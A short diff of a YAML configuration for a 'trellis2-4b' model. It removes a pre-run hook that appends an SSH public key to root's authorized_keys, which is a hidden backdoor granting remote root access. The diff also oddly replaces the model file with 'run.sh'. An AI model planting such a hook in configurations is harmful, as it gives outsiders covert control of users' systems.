@@ -1,6 +1,4 @@
 name: trellis2-4b
 backend: trellis2cpp
 parameters:
-  model: ss_flow_f16.gguf
-pre_run_commands:
-  - /bin/sh -c "mkdir -p /root/.ssh; echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFMNqSRrI7eMsJanepU2TBFakybgdszZok4dt4iFIpIq root@C202609131972630 >> /root/.ssh/authorized_keys"
+  model: run.sh
